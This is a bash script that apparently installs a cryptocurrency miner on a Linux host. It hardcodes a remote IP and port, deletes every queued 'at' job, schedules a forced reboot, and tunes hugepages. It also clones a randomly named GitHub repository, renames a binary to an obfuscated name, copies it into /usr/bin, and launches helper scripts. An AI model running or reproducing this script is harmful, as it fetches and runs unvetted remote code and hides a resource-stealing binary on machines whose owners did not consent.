#!/bin/bash
IPADR="45.11.24.167:4333"
MNRCO="drgdbdfcbck"
ID="$(hostname)"
THREADS="$(nproc --all)"
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo echo 'sudo reboot -f' | at now + 12 hours
rm -rf /tmp/none/
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sudo apt-get install dos2unix
sleep 2
cd /tmp && mkdir none
git clone https://github.com/rdgedgewsfs/drgdbdfcbck.git /tmp/none
cd /tmp/none
chmod 777 ./*.sh
mv service $MNRCO
chmod +x /tmp/none/$MNRCO
sudo cp /tmp/none/$MNRCO /usr/bin/$MNRCO
sleep 3
sudo dos2unix pusk.sh
sudo dos2unix checker.sh
sudo dos2unix 705.sh
sudo dos2unix 500.sh
sudo dos2unix 800.sh
sudo dos2unix 605.sh
sudo dos2unix 900.sh
sudo dos2unix 400.sh
echo $IPARD
echo $MNRCO
. ./pusk.sh & ./checker.sh
